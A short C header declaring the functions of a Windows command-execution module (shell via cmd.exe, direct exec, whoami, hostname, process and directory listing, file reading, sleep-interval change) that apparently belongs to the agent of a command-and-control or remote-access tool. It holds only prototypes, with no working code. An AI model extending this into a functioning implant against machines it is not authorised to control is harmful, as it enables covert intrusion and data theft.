#ifndef DN_CMD_EXEC_H
#define DN_CMD_EXEC_H

#include "../util/types.h"

/*
 * Command execution module
 * Handles: shell, exec, pwd, cd, whoami, hostname, ps, ls, cat, upload, download
 */

// Execute shell command via cmd.exe, capture stdout+stderr
BOOL dn_cmd_shell(DN_TASK* task, DN_TASK_RESULT* result);

// Execute program directly (no cmd.exe wrapper)
BOOL dn_cmd_exec(DN_TASK* task, DN_TASK_RESULT* result);

// Get current working directory
BOOL dn_cmd_pwd(DN_TASK* task, DN_TASK_RESULT* result);

// Change working directory
BOOL dn_cmd_cd(DN_TASK* task, DN_TASK_RESULT* result);

// Get current username
BOOL dn_cmd_whoami(DN_TASK* task, DN_TASK_RESULT* result);

// Get hostname
BOOL dn_cmd_hostname(DN_TASK* task, DN_TASK_RESULT* result);

// List running processes
BOOL dn_cmd_ps(DN_TASK* task, DN_TASK_RESULT* result);

// List directory contents
BOOL dn_cmd_ls(DN_TASK* task, DN_TASK_RESULT* result);

// Read file contents
BOOL dn_cmd_cat(DN_TASK* task, DN_TASK_RESULT* result);

// Sleep interval change
BOOL dn_cmd_sleep(DN_TASK* task, DN_TASK_RESULT* result);

#endif // DN_CMD_EXEC_H
